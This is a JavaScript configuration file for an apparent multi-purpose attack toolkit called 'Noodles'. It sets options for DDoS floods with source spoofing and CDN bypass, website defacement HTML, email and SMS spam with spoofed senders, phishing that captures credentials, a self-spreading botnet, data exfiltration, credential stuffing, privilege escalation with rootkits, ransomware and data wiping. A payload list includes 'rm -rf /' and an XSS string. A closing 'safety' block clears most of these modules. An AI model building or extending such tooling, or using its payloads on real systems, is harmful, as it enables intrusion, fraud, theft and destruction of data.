const credentials = {
  ddos: {
    methods: ['TCP-SYN', 'UDP-Flood', 'HTTP-GET', 'HTTP-POST', 'Slowloris', 'NTP-Amplification', 'DNS-Amplification', 'ACK-Flood', 'RST-Flood', 'ICMP-Flood', 'SYN-ACK-Flood', 'HTTP-Proxy', 'SOCKS4-Proxy', 'SOCKS5-Proxy', 'LAND-Attack', 'Ping-of-Death', 'Smurf-Attack', 'Teardrop-Attack', 'HTTP-RefRef', 'HTTP-RAW'],
    maxThreads: 8192,
    maxConnections: 16384,
    packetSizes: [64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65535],
    torProxyList: [
      'socks5://127.0.0.1:9050',
      'socks5://127.0.0.1:9051',
      'socks5://127.0.0.1:9052',
      'socks5://127.0.0.1:9053',
      'socks5://127.0.0.1:9054',
      'socks5://127.0.0.1:9055',
      'socks5://127.0.0.1:9056',
      'socks5://127.0.0.1:9057',
      'socks5://127.0.0.1:9058',
      'socks5://127.0.0.1:9059',
      'socks5://127.0.0.1:9060',
      'socks5://127.0.0.1:9061',
      'socks5://127.0.0.1:9062',
      'socks5://127.0.0.1:9063',
      'socks5://127.0.0.1:9064',
    ],
    userAgentFile: './main/ddos/useragents.txt',
    rateLimitBypass: {
      techniques: ['cloudflare_bypass', 'incapsula_bypass', 'Sucuri_bypass', 'Akamai_bypass', 'custom_headers', 'browser_emulation', 'http2_abuse'],
      headers: {
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'User-Agent': 'Noodles Bot',
        'Referer': 'https://google.com',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Pragma': 'no-cache',
      },
    },
    advancedOptions: {
      autoAdjustThreads: true,
      randomizePacketSize: true,
      spoofSourceAddress: true,
      maxDuration: 86400,
      useKeepAlive: true,
      maxRetries: 5,
    },
    httpRawOptions: {
      get: "GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\nConnection: keep-alive\r\n\r\n",
      post: "POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\nContent-Length: 1000\r\nConnection: keep-alive\r\n\r\n{data}\r\n",
      randomDataLength: 1024,
    },
  },
  defacement: {
    payloads: {
      'default': '<body bgcolor="black"><center><h1 style="color:red;">HACKED BY NOODLES</h1><p style="color:white;">Site owned.</p></center></body>',
      'political': '<body bgcolor="black"><center><h1 style="color:yellow;">FREEDOM</h1><p style="color:white;">The truth will prevail.</p></center></body>',
      'nsfw': '<body bgcolor="black"><center><img src="https://example.com/nsfw.gif" alt="NSFW Image"><p style="color:white;">Get Noodled!</p></center></body>',
      'rickroll': '<body bgcolor="black"><center><iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" title="Rickroll Video" frameborder="0" allowfullscreen></iframe></center></body>',
      'custom': '',
      'donation': '<body bgcolor="black"><center><h1 style="color:lime;">SUPPORT US</h1><p style="color:white;">Donate Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p></center></body>'
    },
    injectionPoints: ['</body>', '</html>', '<head>', '<form>', '<div>', '<script>', '<iframe>', '<meta>', 'title'],
    autoReplace: true,
    imageUrls: [
      'https://example.com/image1.jpg',
      'https://example.com/image2.png',
      'https://example.com/image3.gif',
      'https://example.com/image4.jpeg',
      'https://example.com/image5.svg',
      'https://example.com/image6.bmp',
    ],
    obfuscate: true,
    backupContent: true,
    recursiveInjection: true,
    maxRecursionDepth: 5,
    excludePaths: ['/wp-admin', '/admin', '/login'],
    httpMethods: ['GET', 'POST', 'PUT', 'DELETE'],
  },
  connection: {
    ports: [21, 22, 23, 80, 443, 8080, 25, 110, 143, 587, 993, 995, 3306, 3389, 27017, 6379, 5432, 1433, 1521, 33060],
    timeout: 1000,
    scanType: ['TCP-Connect', 'TCP-SYN', 'UDP', 'Xmas', 'Null', 'FIN', 'TCP-ACK', 'TCP-Window', 'TCP-URG'],
    concurrency: 1024,
    stealthMode: true,
    randomizePorts: true,
    maxRetries: 3,
    delay: 10,
  },
  logs: {
    maxEntries: 10000,
    logLevel: ['info', 'warn', 'error', 'debug', 'verbose', 'security'],
    fileRotation: true,
    maxLogFiles: 30,
    logFormat: 'json',
    remoteSyslog: {
      enabled: true,
      host: 'syslog.example.com',
      port: 514,
      protocol: 'UDP',
    },
    consoleOutput: true,
  },
  ui: {
    theme: 'darkly',
    resizable: true,
    compact: true,
    animations: true,
    fontSize: '13px',
    customCss: `
      .attack-button {
        background-color: #FF4136 !important;
        color: white !important;
      }
      .attack-button:hover {
        background-color: #D72318 !important;
      }
    `,
    notifications: true,
    enableSounds: true,
    customFavicon: 'https://example.com/favicon.ico',
    defaultLayout: 'horizontal',
    enableTooltips: true,
  },
  apiKeys: [
    'YOUR_API_KEY_HERE',
    'ANOTHER_API_KEY',
    'ADMIN_KEY',
    'ULTIMATE_KEY',
  ],
  honeypotIps: [
    '1.1.1.1',
    '8.8.8.8',
    '9.9.9.9',
    '192.168.1.1',
    '10.0.0.1',
    '172.16.0.1',
    '2.2.2.2',
    '4.4.4.4',
  ],
  proxyCheckUrl: 'http://example.com',
  autoUpdate: true,
  errorReporting: true,
  debugMode: true,
  exploitDatabaseUrl: 'http://example.com/exploits.json',
  backupServerUrl: 'http://backup.example.com',
  rateLimit: {
    requestsPerMinute: 480,
    burstLimit: 800,
    banDuration: 1200,
    useRedis: true,
    redisConfig: {
      host: 'localhost',
      port: 6379,
      password: 'redisPassword',
    },
  },
  geoIpLookupUrl: 'http://example.com/geoip',
  signature: 'Noodles v1.0',
  autoBan: {
    enabled: true,
    threshold: 3,
    duration: 14400,
    whitelistIps: ['127.0.0.1', '::1'],
    blacklistIps: ['192.168.0.100'],
    logBannedIps: true,
  },
  security: {
    xssProtection: true,
    csrfProtection: true,
    contentSecurityPolicy: "default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' data:; font-src 'self' data: https://www.youtube.com; media-src 'self' data: https://www.youtube.com; object-src 'none';",
    hstsEnabled: true,
    hstsMaxAge: 31536000,
    clickjackingProtection: true,
    strictTransportSecurity: 'max-age=31536000; includeSubDomains; preload',
  },
  monitoring: {
    systemStats: true,
    networkStats: true,
    processStats: true,
    bandwidthStats: true,
    alerting: {
      cpuThreshold: 95,
      memoryThreshold: 95,
      diskThreshold: 98,
      emailAlerts: true,
      emailConfig: {
        service: 'gmail',
        auth: {
          user: 'monitoring@example.com',
          pass: 'monitoringPassword',
        },
        to: 'admin@example.com',
      },
      smsAlerts: true,
    },
    logToFile: true,
    logFilePath: './logs/monitoring.log',
  },
  modules: {
    portScanner: true,
    whoisLookup: true,
    headerGrabber: true,
    dnsLookup: true,
    reverseIpLookup: true,
    subnetCalculator: true,
    geoIpLookup: true,
    emailValidator: true,
    passwordGenerator: true,
    hashCalculator: true,
    urlShortener: true,
  },
  spam: {
    email: {
      enabled: true,
      smtpServer: 'smtp.example.com',
      smtpPort: 587,
      username: 'spam@example.com',
      password: 'spamPassword',
      fromAddress: 'spam@example.com',
      rateLimit: 600,
      spoofSender: true,
      htmlContent: '<p>You have been Noodled!</p>',
    },
    sms: {
      enabled: true,
      apiEndpoint: 'https://sms.example.com/send',
      apiKey: 'SMS_API_KEY',
      rateLimit: 200,
      spoofNumber: true,
    },
    socialMedia: {
      enabled: false,
      apiKeys: {
        twitter: 'TWITTER_API_KEY',
        facebook: 'FACEBOOK_API_KEY',
        instagram: 'INSTAGRAM_API_KEY',
      },
      rateLimit: 50,
    },
    pushNotifications: {
      enabled: false,
      apiKey: 'PUSH_API_KEY',
      rateLimit: 100,
    }
  },
  phishing: {
    cloneWebsite: true,
    redirectUrl: 'http://example.com/login',
    customPages: {
      'login': 'http://example.com/login.html',
      'signup': 'http://example.com/signup.html',
      'password_reset': 'http://example.com/reset.html',
    },
    sslEnabled: true,
    captureCredentials: true,
    logCredentials: true,
    credentialLogFile: './logs/credentials.log',
    sendCredentialsEmail: true,
    emailConfig: {
      service: 'gmail',
      auth: {
        user: 'phishing@example.com',
        pass: 'phishingPassword',
      },
      to: 'admin@example.com',
    },
    trackIpAddress: true,
    detectBots: true,
    bypassAntiPhishing: true,
  },
  botnet: {
    enabled: true,
    controlServer: 'http://control.example.com',
    encryptionKey: 'SUPER_SECRET_KEY',
    heartbeatInterval: 60,
    commandAndControlProtocol: 'HTTP',
    autoSpread: true,
    selfUpdate: true,
    persistence: true,
    antiAnalysis: true,
    rootkitCapabilities: true,
  },
  torIntegration: {
    enabled: true,
    controlPort: 9051,
    password: 'TOR_PASSWORD',
    newIdentityInterval: 300,
    autoRenewCircuits: true,
    hiddenService: {
      enabled: true,
      port: 80,
      targetPort: 8080,
    },
  },
  dataExfiltration: {
    enabled: true,
    exfiltrationMethod: ['FTP', 'HTTP', 'DNS', 'Email', 'ICMP', 'TOR'],
    exfiltrationServer: 'ftp.example.com',
    exfiltrationPath: '/data',
    encryptionEnabled: true,
    compressionEnabled: true,
    chunkSize: 4096,
    obfuscateData: true,
  },
  automaticExploitation: {
    enabled: true,
    targets: ['SQL Injection', 'XSS', 'RCE', 'LFI', 'RFI', 'CSRF', 'Directory Traversal', 'Code Injection'],
    customExploits: [
      {
        name: 'MyCustomExploit',
        payload: 'evil_code',
        target: 'RCE'
      }
    ],
    fuzzingEnabled: true,
    payloadList: ['../', '%00', '<script>alert("XSS")</script>', 'rm -rf /', 'SELECT * FROM users;'],
    autoTargetDiscovery: true,
    exploitDatabaseIntegration: true,
  },
  reverseEngineering: {
    enabled: true,
    disassembler: 'ghidra',
    debugger: 'x64dbg',
    decompiler: 'jd-gui',
    decompilationEnabled: true,
    debuggingEnabled: true,
    staticAnalysisEnabled: true,
    dynamicAnalysisEnabled: true,
    antiDebuggingTechniques: true,
  },
  credentialStuffing: {
    enabled: true,
    credentialListUrl: 'http://example.com/credentials.txt',
    targetSites: ['http://example.com/login'],
    captchaBypass: true,
    proxyRotation: true,
    userAgentRotation: true,
    errorHandling: true,
    successRateTracking: true,
  },
  networkSniffing: {
    enabled: true,
    interface: 'eth0',
    promiscuousMode: true,
    captureAllTraffic: true,
    filterRules: ['port 80', 'port 443', 'host example.com'],
    packetAnalysis: true,
    protocolDissection: true,
    logSniffedData: true,
    sniffedDataLogFile: './logs/sniffed_data.log',
  },
  privilegeEscalation: {
    enabled: true,
    targets: ['Linux', 'Windows', 'MacOS'],
    knownVulnerabilities: ['CVE-2023-XXXX', 'CVE-2023-YYYY'],
    exploitExecution: true,
    kernelExploitation: true,
    postExploitation: true,
    persistenceMechanisms: ['Scheduled Tasks', 'Startup Scripts', 'Service Modification'],
    rootkitInstallation: true,
  },
  hardwareHacking: {
    enabled: false,
    jtagDebugging: true,
    uartCommunication: true,
    spiFlashProgramming: true,
    reverseEngineeringFirmware: true,
    sideChannelAttacks: true,
    faultInjection: true,
    physicalAccessRequired: false,
  },
  socialEngineering: {
    enabled: true,
    pretextLibrary: ['Impersonating IT Support', 'Fake Job Offer', 'Emergency Assistance'],
    spearPhishingCampaign: true,
    vishingCampaign: true,
    baitingTechniques: ['Infected USB Drives', 'Free Software Download'],
    quidProQuo: true,
    tailgating: false,
    dumpsterDiving: false,
    influenceTechniques: ['Authority', 'Scarcity', 'Reciprocity'],
    psychologicalManipulation: true,
    emotionalExploitation: true,
  },
  ransomware: {
    enabled: false,
    encryptionAlgorithm: 'AES-256',
    fileExtensions: ['.docx', '.pdf', '.jpg', '.zip'],
    ransomNote: 'Your files have been encrypted. Pay Bitcoin to recover them.',
    paymentDeadline: 72,
    threatActorAttribution: 'Noodles Gang',
    dataLeakageThreat: true,
    automaticDecryption: false,
    antiSandboxTechniques: true,
  },
  dataWiping: {
    enabled: false,
    wipingAlgorithm: 'Gutmann',
    iterations: 35,
    targetDirectories: ['/home', '/var/log', '/tmp'],
    secureDeletion: true,
    overwriteFreeSpace: true,
    shreddingTechniques: true,
    antiForensicMeasures: true,
    irreversibleDeletion: true,
  },
  // Added a section to disable potentially malicious features
  safety: {
    disableDangerousFeatures: true, // If true, disables features below
    disabledModules: [ // Add names of modules to disable
      'ddos',
      'defacement',
      'automaticExploitation',
      'reverseEngineering',
      'credentialStuffing',
      'networkSniffing',
      'privilegeEscalation',
      'hardwareHacking',
      'socialEngineering',
      'ransomware',
      'dataWiping',
      'botnet',
      'phishing',
      'spam',
      'dataExfiltration'
    ]
  }
};

if (credentials.safety.disableDangerousFeatures) {
  credentials.safety.disabledModules.forEach(moduleName => {
    if (credentials[moduleName]) {
      console.warn(`[SECURITY] Disabling potentially dangerous module: ${moduleName}`);
      for (const key in credentials[moduleName]) {
        if (typeof credentials[moduleName][key] === 'boolean') {
          credentials[moduleName][key] = false; // Primarily disables "enabled" flags
        } else if (Array.isArray(credentials[moduleName][key])){
            credentials[moduleName][key] = []; // Empty the array
        } else if (typeof credentials[moduleName][key] === 'string'){
            credentials[moduleName][key] = ''; // Clears strings
        } else if(typeof credentials[moduleName][key] === 'number'){
          credentials[moduleName][key] = 0; // Set to zero
        }
      }
    }
  });
}

module.exports = credentials;